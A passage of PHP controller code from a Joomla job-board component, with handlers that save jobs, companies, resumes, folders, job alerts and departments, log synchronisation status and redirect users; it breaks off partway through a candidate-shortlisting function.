	function savejob() //save job
	{
		global $mainframe;
		
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		
		$return_data = $employer_model->storeJob();
		if(is_array($return_data)){
				if($return_data['isjobstore']==1){
					if($return_data['status']=="Job Edit"){
						$serverjobstatus="ok";
					}elseif($return_data['status']=="Job Add"){
						$serverjobstatus="ok";
					}elseif($return_data['status']=="Edit Job Userfield"){
						$serverjobstatus="ok";
					}elseif($return_data['status']=="Add Job Userfield"){
						$serverjobstatus="ok";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_data['referenceid'];
					$logarray['eventtype']=$return_data['eventtype'];
					$logarray['message']=$return_data['message'];
					$logarray['event']="job";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					if(isset($return_data['jobcities'])){
						$jobsharing->update_MultiCityServerid($return_data['jobcities'],'jobcities');
					}
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobstatus,$logarray['referenceid'],$return_data['serverid'],$logarray['uid'],'jobs');
				}elseif($return_data['isjobstore']==0){
					if($return_data['status']=="Data Empty"){
						$serverjobstatus="Data not post on server";
					}elseif($return_data['status']=="job Saving Error"){
						$serverjobstatus="Error Job Saving";
					}elseif($return_data['status']=="Auth Fail"){
						$serverjobstatus="Authentication Fail";
					}elseif($return_data['status']=="Error Save Job Userfield"){
						$serverjobstatus="Error Save Job Userfield";
					}elseif($return_data['status']=="Improper job name"){
						$serverjobstatus="Improper job name";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_data['referenceid'];
					$logarray['eventtype']=$return_data['eventtype'];
					$logarray['message']=$return_data['message'];
					$logarray['event']="job";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'jobs');
				}
				$msg = JText :: _('JOB_SAVED');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&Itemid='.$Itemid;
			
		}else{
			if ($return_data == 1)	{
				$msg = JText :: _('JOB_SAVED');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&Itemid='.$Itemid;
			}else if ($return_data == 2){
				$msg = JText :: _('JS_FILL_REQ_FIELDS');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formjob&Itemid='.$Itemid;
			}else if ($return_data == 11){ // start date not in oldate
				$msg = JText :: _('JS_START_DATE_NOT_OLD_DATE');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formjob&Itemid='.$Itemid;
			}else if ($return_data == 12){
				$msg = JText :: _('JS_START_DATE_NOT_LESS_STOP_DATE');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formjob&Itemid='.$Itemid;
			}else{
				$msg = JText :: _('ERROR_SAVING_JOB');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myjobs&Itemid='.$Itemid;
			}
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

	function savejobvisitor() //save company and job for visitor
	{
		global $mainframe;
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');

		$Itemid =  JRequest::getVar('Itemid');

		$return_value = $employer_model->storeCompanyJobForVisitor();
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=controlpanel&Itemid='.$Itemid;
		if(is_array($return_value)){
				if($return_value['isjobstore']==1){
					if($return_value['status']=="Job Edit"){
						$serverjobstatus="ok";
					}elseif($return_value['status']=="Job Add"){
						$serverjobstatus="ok";
					}elseif($return_value['status']=="Edit Job Userfield"){
						$serverjobstatus="ok";
					}elseif($return_value['status']=="Add Job Userfield"){
						$serverjobstatus="ok";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="job";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobstatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'jobs');
				}elseif($return_value['isjobstore']==0){
					if($return_value['status']=="Data Empty"){
						$serverjobstatus="Data not post on server";
					}elseif($return_value['status']=="job Saving Error"){
						$serverjobstatus="Error Job Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$serverjobstatus="Authentication Fail";
					}elseif($return_value['status']=="Error Save Job Userfield"){
						$serverjobstatus="Error Save Job Userfield";
					}elseif($return_value['status']=="Improper job name"){
						$serverjobstatus="Improper job name";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']="Visitor".$return_value['message'];
					$logarray['event']="job";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverjobstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'jobs');
				}
				$msg = JText :: _('JOB_SAVED');
			
		}else{
			if ($return_value == 1)	{ 
				$msg = JText :: _('JOB_SAVED');
			}elseif($return_value == 5){
				$msg = JText :: _('JS_ERROR_LOGO_SIZE_LARGER');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formjob_visitor&Itemid='.$Itemid;
			}elseif($return_value == 6){
				$msg = JText :: _('JS_JOB_FILE_TYPE_ERROR');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formjob_visitor&Itemid='.$Itemid;
			}elseif($return_value == 2){
				$msg = JText :: _('JS_ERROR_INCORRECT_CAPTCHA_CODE');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formjob_visitor&Itemid='.$Itemid;
			}else{	
				$msg = JText :: _('ERROR_SAVING_JOB');
			}
		}	
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);

	}

	function savecompany() //save company
	{
		global $mainframe;
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		
		$return_value = $employer_model->storeCompany();
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=mycompanies&Itemid='.$Itemid;
		if(is_array($return_value)){
				if($return_value['iscompanystore']==1){
					if($return_value['status']=="Company Edit"){
						$servercompanytatus="ok";
					}elseif($return_value['status']=="Company Add"){
						$servercompanytatus="ok";
					}elseif($return_value['status']=="Company with logo Add"){
						$servercompanytatus="ok";
					} 
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Company";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					if(isset($return_value['companycities'])){
						$jobsharing->update_MultiCityServerid($return_value['companycities'],'companycities');
					}
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($servercompanytatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'companies');
				}elseif($return_value['iscompanystore']==0){
					if($return_value['status']=="Data Empty"){
						$servercompanytatus="Data not post on server";
					}elseif($return_value['status']=="Company Saving Error"){
						$servercompanytatus="Error Company Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$servercompanytatus="Authentication Fail";
					}elseif($return_value['status']=="Improper Company name"){
						$servercompanytatus="Improper Company name";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Company";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($servercompanytatus,$logarray['referenceid'],$serverid,$logarray['uid'],'companies');
				}
				$msg = JText :: _('COMPANY_SAVED');
			
		}else{
		
			if ($return_value == 1)	{ 
				$msg = JText :: _('COMPANY_SAVED');
			}else if ($return_value == 2){	
				$msg = JText :: _('JS_FILL_REQ_FIELDS');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formcompany&Itemid='.$Itemid;
			}else if ($return_value == 6){	
				$msg = JText :: _('JS_COMPANY_FILE_TYPE_ERROR');
			}else if ($return_value == 5){ 
				$msg = JText :: _('JS_ERROR_LOGO_SIZE_LARGER');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formcompany&Itemid='.$Itemid;
			}else{	
				$msg = JText :: _('ERROR_SAVING_COMPANY');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formcompany&Itemid='.$Itemid;
			}
		}	
			//$this->setRedirect($link, $msg);
			$this->setRedirect(JRoute::_($link), $msg);

	}
    function savejobalertsetting() //save company
	{
		global $mainframe;
                $data = JRequest:: get('post');
	
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		
		$Itemid =  JRequest::getVar('Itemid');
		$return_value = $jobseeker_model->storeJobAlertSetting();
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=jobalertsetting&Itemid='.$Itemid;
		if(is_array($return_value)){
				if($return_value['isjobalertstore']==1){
					if($return_value['status']=="Job Alert Edit"){
						$jobalertstatus="ok";
					}elseif($return_value['status']=="Job Alert Add"){
						$jobalertstatus="ok";
					} 
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Job Alert";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					if(isset($return_value['alertcities'])){
						$jobsharing->update_MultiCityServerid($return_value['alertcities'],'jobalertcities');
					}
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($jobalertstatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'jobalertsetting');
				}elseif($return_value['isjobalertstore']==0){
					if($return_value['status']=="Data Empty"){
						$jobalertstatus="Data not post on server";
					}elseif($return_value['status']=="Job Alert Saving Error"){
						$jobalertstatus="Error Job Alert Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$jobalertstatus="Authentication Fail";
					}
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Job Alert";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($jobalertstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'jobalertsetting');
				}
				$msg = JText :: _('JS_JOB_ALERT_SETTING_SAVED');
		}else{
		
			if ($return_value == 1)	{ $msg = JText :: _('JS_JOB_ALERT_SETTING_SAVED');}
					else if ($return_value == 2){	$msg = JText :: _('JS_FILL_REQ_FIELDS'); }
					else if ($return_value == 3){	$msg = JText :: _('JS_EMAIL_ALREADY_EXISTS'); }
					else if ($return_value == 8){	$msg = JText :: _('JS_ERROR_INCORRECT_CAPTCHA_CODE'); }
					else{	$msg = JText :: _('JS_ERROR_SAVING_JOB_ALERT_SETTING');	}
		}			
		$this->setRedirect(JRoute::_($link), $msg);
	}
	function saveresumecomments() // save resume comments
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$data=array();
		$data['id'] =  JRequest::getVar('jobapplyid');
		$data['resumeid'] =  JRequest::getVar('resumeid');
		$data['comments'] =  JRequest::getVar('comments');
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$return_value = $jobseeker_model->storeResumeComments($data);
		//$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$data['jobid'];
			if(is_array($return_value)){
					if($return_value['isresumecommentsstore']==1){
						$logarray['uid']=$jobseeker_model->_uid;
						$logarray['eventtype']=$return_value['eventtype'];
						$logarray['referenceid']=$return_value['referenceid'];
						$logarray['message']=$return_value['message'];
						$logarray['event']="Resume Comments";
						$logarray['messagetype']="Sucessfully";
						$logarray['datetime']=date('Y-m-d H:i:s');
						$jobsharing->write_JobSharingLog($logarray);
					}elseif($return_value['isresumecommentsstore']==0){
						if($return_value['status']=="Data Empty"){
							$serverresumeratingstatus="Data not post on server";
						}elseif($return_value['status']=="Resume Comments Saving Error"){
							$serverresumeratingstatus="Error Resume Comments Saving";
						}elseif($return_value['status']=="Auth Fail"){
							$serverresumeratingstatus="Authentication Fail";
						}
						$logarray['uid']=$jobseeker_model->_uid;
						$logarray['referenceid']=$return_value['referenceid'];
						$logarray['eventtype']=$return_value['eventtype'];
						$logarray['message']=$return_value['message'];
						$logarray['event']="Resume Comments";
						$logarray['messagetype']="Error".$serverresumeratingstatus;
						$logarray['datetime']=date('Y-m-d H:i:s');
						$jobsharing->write_JobSharingLog($logarray);
					}
					$msg = JText :: _('JS_RESUME_COMMENTS_SAVE');
			}else{
				if ($return_value == 1)	$msg = JText :: _('JS_RESUME_COMMENTS_SAVE');
				else	$msg = JText :: _('JS_ERROR_SAVING_RESUME_RESUME_COMMENTS');
			}
			echo $msg;
			$mainframe->close();
			
			//$this->setRedirect(JRoute::_($link), $msg);
			//$this->setRedirect($link, $msg);
	}
        function getresumecomments()  {
            global $mainframe;
			
			$mainframe = &JFactory::getApplication();
            $user	=& JFactory::getUser();
            $jobapplyid=JRequest::getVar( 'jobapplyid');

			$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
            
            $returnvalue = $jobseeker_model->getResumeCommentsAJAX($user->id,$jobapplyid);

            echo $returnvalue;
            $mainframe->close();
        }
        function saveresumerating()  {
            global $mainframe;
			$mainframe = &JFactory::getApplication();
            $user=& JFactory::getUser();
            $uid=$user->id;
            $ratingid=JRequest::getVar( 'ratingid');
            $jobid=JRequest::getVar( 'jobid');
            $resumeid=JRequest::getVar( 'resumeid');
            $newrating=JRequest::getVar( 'newrating');

			$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
			$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
            
            $return_value = $jobseeker_model->storeResumeRating($uid,$ratingid,$jobid,$resumeid,$newrating);
			if(is_array($return_value)){
					if($return_value['isresumeratingstore']==1){
						if($return_value['status']=="Resumerating Sucessfully"){
							$serverresumeratingstatus="ok";
						} 
						$logarray['uid']=$jobseeker_model->_uid;
						$logarray['referenceid']=$return_value['referenceid'];
						$logarray['eventtype']=$return_value['eventtype'];
						$logarray['message']=$return_value['message'];
						$logarray['event']="Resumerating";
						$logarray['messagetype']="Sucessfully";
						$logarray['datetime']=date('Y-m-d H:i:s');
						$jobsharing->write_JobSharingLog($logarray);
						$jobsharing->Update_ServerStatus($serverresumeratingstatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'resumerating');
					}elseif($return_value['isresumeratingstore']==0){
						if($return_value['status']=="Data Empty"){
							$serverresumeratingstatus="Data not post on server";
						}elseif($return_value['status']=="Resumerating Saving Error"){
							$serverresumeratingstatus="Error Resumerating Saving";
						}elseif($return_value['status']=="Auth Fail"){
							$serverresumeratingstatus="Authentication Fail";
						}
						$logarray['uid']=$jobseeker_model->_uid;
						$logarray['referenceid']=$return_value['referenceid'];
						$logarray['eventtype']=$return_value['eventtype'];
						$logarray['message']=$return_value['message'];
						$logarray['event']="Resumerating";
						$logarray['messagetype']="Error";
						$logarray['datetime']=date('Y-m-d H:i:s');
						$serverid=0;
						$jobsharing->write_JobSharingLog($logarray);
						$jobsharing->Update_ServerStatus($serverresumeratingstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'resumerating');
					}
				echo 1;	
				$mainframe->close();
			}else{
				echo $return_value;
				$mainframe->close();
			}

        }
        function savefolder() // save folder
	{
		global $mainframe;

		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');

		$return_value = $employer_model->storeFolder();
		if(is_array($return_value)){
				if($return_value['isfolderstore']==1){
					if($return_value['status']=="Folder Edit"){
						$serverfolderstatus="ok";
					}elseif($return_value['status']=="Folder Add"){
						$serverfolderstatus="ok";
					} 
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Folder";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverfolderstatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'folders');
				}elseif($return_value['isfolderstore']==0){
					if($return_value['status']=="Data Empty"){
						$serverfolderstatus="Data not post on server";
					}elseif($return_value['status']=="Folder Saving Error"){
						$serverfolderstatus="Error Folder Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$serverfolderstatus="Authentication Fail";
					}elseif($return_value['status']=="Improper Folder name"){
						$serverfolderstatus="Improper Folder name";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Folder";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverfolderstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'folders');
				}
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myfolders&Itemid='.$Itemid;
				 $msg = JText :: _('JS_FOLDER_SAVED');
		}else{
			
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=myfolders&Itemid='.$Itemid;
				if ($return_value == 1)	{
					 $msg = JText :: _('JS_FOLDER_SAVED');
				}else if ($return_value == 2){
					$msg = JText :: _('JS_FILL_REQ_FIELDS');
					$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=formfolder&Itemid='.$Itemid;
				}elseif($return_value == 3){
							$msg = JText::_('JS_FOLDER_ALREADY_EXIST');
				}else{	$msg = JText :: _('ERROR_SAVING_FOLDERS');
				}
				//$this->setRedirect($link, $msg);
			
		}
		
		$this->setRedirect(JRoute::_($link), $msg);

	}
        function saveresumefolder() // save folder
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();
		$data=array();
		$data['jobid']=JRequest::getVar( 'jobid');
		$data['resumeid']=JRequest::getVar( 'resumeid');
		$data['applyid']=JRequest::getVar( 'applyid');
		$data['folderid']=JRequest::getVar( 'folderid');
	
	
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$Itemid =  JRequest::getVar('Itemid');
		$return_value = $employer_model->storeFolderResume($data);
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=job_appliedapplications&bd='.$data['jobid'].'&Itemid='.$Itemid;
		if(is_array($return_value)){
					if($return_value['isfolderresumestore']==1){
						if($return_value['status']=="Folderresume Sucessfully"){
							$serverfolderresumestatus="ok";
						} 
						$logarray['uid']=$employer_model->_uid;
						$logarray['referenceid']=$return_value['referenceid'];
						$logarray['eventtype']=$return_value['eventtype'];
						$logarray['message']=$return_value['message'];
						$logarray['event']="Folder Resume";
						$logarray['messagetype']="Sucessfully";
						$logarray['datetime']=date('Y-m-d H:i:s');
						$jobsharing->write_JobSharingLog($logarray);
						$jobsharing->Update_ServerStatus($serverfolderresumestatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'folderresumes');
					}elseif($return_value['isfolderresumestore']==0){
						if($return_value['status']=="Data Empty"){
							$serverfolderresumestatus="Data not post on server";
						}elseif($return_value['status']=="Folderresume Saving Error"){
							$serverfolderresumestatus="Error Folder Resume Saving";
						}elseif($return_value['status']=="Auth Fail"){
							$serverfolderresumestatus="Authentication Fail";
						}
						$logarray['uid']=$employer_model->_uid;
						$logarray['referenceid']=$return_value['referenceid'];
						$logarray['eventtype']=$return_value['eventtype'];
						$logarray['message']=$return_value['message'];
						$logarray['event']="Folder Resume";
						$logarray['messagetype']="Error";
						$logarray['datetime']=date('Y-m-d H:i:s');
						$serverid=0;
						$jobsharing->write_JobSharingLog($logarray);
						$jobsharing->Update_ServerStatus($serverfolderresumestatus,$logarray['referenceid'],$serverid,$logarray['uid'],'folderresumes');
					}
					$msg = JText :: _('JS_RESUME_FOLDER_SAVED');
			}else{
		
				if ($return_value == 1)	{ $msg = JText :: _('JS_RESUME_FOLDER_SAVED');
				}elseif($return_value == 3){
							$msg = JText::_('JS_RESUME_ALREADY_EXISTS_IN_FOLDER' );
				}else{	$msg = JText :: _('ERROR_SAVING_FOLDERS');
				}
			}	
			echo $msg;
			$mainframe->close();
                
	}

	function saveresume()
	{
		global $mainframe;
		
		$jobseeker_model = $this->getModel('Jobseeker', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		
		$session = &JFactory::getSession();
		$user	=& JFactory::getUser();
		$uid=$user->id;
		$Itemid =  JRequest::getVar('Itemid');

		if ($uid){
			$return_value = $jobseeker_model->storeResume('');
		}else{
			$visitor = $session->get('jsjob_jobapply');
			$return_value = $jobseeker_model->storeResume($visitor['bi']);
		}
		
		
		if(is_array($return_value)){
				if($return_value['isresumestore']==1){
					if($return_value['status']=="Resume Edit"){
						$serverresumestatus="ok";
					}elseif($return_value['status']=="Resume Add"){
						$serverresumestatus="ok";
					}elseif($return_value['status']=="Edit Resume Userfield"){
						$serverresumestatus="ok";
					}elseif($return_value['status']=="Add Resume Userfield"){
						$serverresumestatus="ok";
					}elseif($return_value['status']=="Resume with Picture"){
						$serverresumestatus="ok";
					}elseif($return_value['status']=="Resume with File"){
						$serverresumestatus="ok";
					} 
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Resume";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverresumestatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'resume');
				}elseif($return_value['isresumestore']==0){
					if($return_value['status']=="Data Empty"){
						$serverresumestatus="Data not post on server";
					}elseif($return_value['status']=="Resume Saving Error"){
						$serverresumestatus="Error Resume Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$serverresumestatus="Authentication Fail";
					}elseif($return_data['status']=="Error Save Resume Userfield"){
						$serverresumestatus="Error Save Resume Userfield";
					}elseif($return_value['status']=="Improper Resume name"){
						$serverresumestatus="Improper Resume name";
					}
					$logarray['uid']=$jobseeker_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Resume";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverresumestatus,$logarray['referenceid'],$serverid,$logarray['uid'],'resume');
				}
				$msg = JText :: _('EMP_APP_SAVED');
				if ($uid) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&Itemid='.$Itemid;
				else{
					$visitor['visitor'] = '';
					$visitor['bi'] = '';
					$session->set('jsjob_jobapply', $visitor);
					$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=controlpanel&Itemid='.$Itemid;
				}
			
		}else{
			if ($return_value == 1)	{
				$msg = JText :: _('EMP_APP_SAVED');
							if ($uid) $link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&Itemid='.$Itemid;
							else{
								$visitor['visitor'] = '';
								$visitor['bi'] = '';
								$session->set('jsjob_jobapply', $visitor);
								$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=controlpanel&Itemid='.$Itemid;
							}
			}else if ($return_value == 2){
				$msg = JText :: _('JS_FILL_REQ_FIELDS');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=formresume&Itemid='.$Itemid;
			}else if ($return_value == 6){ // file type mismatch
				$msg = JText :: _('JS_FILE_TYPE_ERROR');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&Itemid='.$Itemid;
			}else if ($return_value == 7){ // photo file size 
				$msg = JText :: _('JS_ERROR_PHOTO_SIZE_LARGER');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=formresume&Itemid='.$Itemid;
			}else if ($return_value == 8){ // captcha error 
				$msg = JText :: _('JS_ERROR_INCORRECT_CAPTCHA_CODE');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=formresume&Itemid='.$Itemid;
			}else if ($return_value == 3){
				$msg = JText :: _('JS_ALREADY_APPLY_JOB');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=controlpanel&Itemid='.$Itemid;
			}else{
				$msg = JText :: _('ERROR_SAVING_EMP_APP');
				$link = 'index.php?option=com_jsjobs&c=jsjobs&view=jobseeker&layout=myresumes&uid='.$uid.'&Itemid='.$Itemid;
			}
			
		}
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}

function savedepartment() //save department
	{
		global $mainframe;
		
		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$session = &JFactory::getSession();
		$uid = &JRequest::getString('uid','none');
		
		$Itemid =  JRequest::getVar('Itemid');
		$return_value = $employer_model->storeDepartment();
		if(is_array($return_value)){
				if($return_value['isdepartmentstore']==1){
					if($return_value['status']=="Department Edit"){
						$serverdepartmentstatus="ok";
					}elseif($return_value['status']=="Department Add"){
						$serverdepartmentstatus="ok";
					} 
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Department";
					$logarray['messagetype']="Sucessfully";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverdepartmentstatus,$logarray['referenceid'],$return_value['serverid'],$logarray['uid'],'departments');
				}elseif($return_value['isdepartmentstore']==0){
					if($return_value['status']=="Data Empty"){
						$serverdepartmentstatus="Data not post on server";
					}elseif($return_value['status']=="Department Saving Error"){
						$serverdepartmentstatus="Error Department Saving";
					}elseif($return_value['status']=="Auth Fail"){
						$serverdepartmentstatus="Authentication Fail";
					}elseif($return_value['status']=="Improper Department name"){
						$serverdepartmentstatus="Improper Department name";
					}
					$logarray['uid']=$employer_model->_uid;
					$logarray['referenceid']=$return_value['referenceid'];
					$logarray['eventtype']=$return_value['eventtype'];
					$logarray['message']=$return_value['message'];
					$logarray['event']="Department";
					$logarray['messagetype']="Error";
					$logarray['datetime']=date('Y-m-d H:i:s');
					$serverid=0;
					$jobsharing->write_JobSharingLog($logarray);
					$jobsharing->Update_ServerStatus($serverdepartmentstatus,$logarray['referenceid'],$serverid,$logarray['uid'],'departments');
				}
				$msg = JText :: _('JS_DEPARTMENT_SAVED');
			
		}else{
		
			if ($return_value == 1)	{
				$msg = JText :: _('JS_DEPARTMENT_SAVED');
			}else if ($return_value == 2){
				$msg = JText :: _('JS_FILL_REQ_FIELDS');
			}else{
				$msg = JText :: _('JS_ERROR_SAVING_DEPARTMENT');
			}
		}	
		$link = 'index.php?option=com_jsjobs&c=jsjobs&view=employer&layout=mydepartments&Itemid='.$Itemid;
		//$this->setRedirect($link, $msg);
		$this->setRedirect(JRoute::_($link), $msg);
	}
	function saveshortlistcandiate() //save shortlist candidate
	{
		global $mainframe;
		$mainframe = &JFactory::getApplication();

		$employer_model = $this->getModel('Employer', 'JSJobsModel');
		$jobsharing = $this->getModel('job_sharing', 'JSJobsModel');
		$data=array();
		$Itemid =  JRequest::getVar('Itemid');
		$data['action'] =  JRequest::getVar('action');
		$data['resumeid'] =  JRequest::getVar('resumeid');
		$data['jobid'] =  JRequest::getVar('jobid');
		$user	=& JFactory::getUser();
		$uid = $user->id;
		//$data = JRequest :: get('post');
		//$jobid=$data['jobid'];
                //echo 'ac '.$data['action'];
		if($data['action'] == 1){ // short list
                    $return_value = $employer_model->storeShortListCandidate($uid,$data);
					if(is_array($return_value)){
							if($return_value['isshortlistcandidatesstore']==1){
								if($return_value['status']=="Shortlistcandidates Sucessfully"){
									$servershortlistcandidates="ok";
